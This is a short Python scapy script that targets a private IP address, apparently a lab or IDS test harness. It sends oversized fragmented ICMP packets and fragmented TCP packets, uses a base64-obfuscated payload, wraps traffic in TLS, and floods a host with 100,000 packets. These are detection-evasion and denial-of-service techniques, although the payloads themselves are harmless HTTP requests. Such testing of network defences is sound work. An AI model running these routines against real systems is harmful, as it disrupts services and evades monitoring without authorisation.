from scapy.all import IP, ICMP, fragment, send, TCP, Raw
import base64
import ssl
import socket
packets = fragment(IP(dst='10.125.26.56')/ICMP()/("X"*600000))

# for packet in packets:
#     print(packet)
#     send(packet)

def send_fragment(dst, port):
    payload = f"GET /search?q=apple HTTP/1.1 \r\nhost:{dst}"
    packets = fragment(IP(dst)/TCP(dport=port)/Raw(load=payload))
    for packet in packets:
        print(packet)
        send(packet)

send_fragment(b"10.125.26.56",22)


def obfuscated_payload(dst, port):
    payload = f"GET /search?q=apple HTTP/1.1 \r\nhost:{dst}"
    obfuscated_payload = base64.b64encode(payload.encode()).decode()
    packets = fragment(IP(dst)/TCP(dport=port)/Raw(load=obfuscated_payload))
    for packet in packets:
        print(packet)
        send(packet)

def encrypted_traffic(dst, port):
    context = ssl.create_default_context()
    with socket.create_connection((dst, port)) as sock:
        with context.wrap_socket(sock=sock, server_hostname=dst) as ssock:
            request = f"GET /search?q=apple HTTP/1.1 \r\nhost:{dst}"
            ssock.sendall(request.encode())

def flood_requests(dst, port):
    payload = f"GET /search?q=apple HTTP/1.1 \r\nhost:{dst}\r\nUser-agent: Mozilla"
    packets = IP(dst)/TCP(dport=port)/Raw(load=payload)
    for _ in range(100000):
        send(packets)


